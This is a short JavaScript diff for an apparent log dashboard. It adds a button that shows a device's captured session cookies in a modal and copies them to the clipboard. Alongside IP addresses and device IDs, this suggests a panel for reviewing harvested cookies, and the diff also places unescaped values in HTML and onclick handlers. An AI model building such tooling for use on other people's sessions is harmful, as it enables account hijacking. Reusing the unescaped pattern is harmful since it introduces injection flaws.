@@ -365,10 +365,28 @@ function renderLogs(logs) {
       <div class="log-right">
         <span class="log-ip">${log.ip_address || 'Unknown IP'}</span>
         <span class="log-time">${timeFormatted}</span>
+        ${log.session_cookies ? `<button class="btn-secondary" style="margin-top:8px; padding: 4px 8px; font-size:11px;" onclick="viewCookies('${btoa(log.session_cookies)}', '${log.device_id || 'Unknown'}')">View Data</button>` : ''}
       </div>
     `;
     container.appendChild(div);
   });
+}
+
+function viewCookies(base64Cookies, deviceId) {
+  const cookiesStr = atob(base64Cookies);
+  document.getElementById('cookieDataText').value = cookiesStr;
+  document.getElementById('cookieDeviceId').textContent = deviceId;
+  document.getElementById('cookieModal').style.display = 'flex';
+}
+
+function closeCookieModal() {
+  document.getElementById('cookieModal').style.display = 'none';
+}
+
+function copyCookies() {
+  const text = document.getElementById('cookieDataText').value;
+  navigator.clipboard.writeText(text);
+  showToast('Cookies copied to clipboard!');
 }
 
 // Password Gate Check
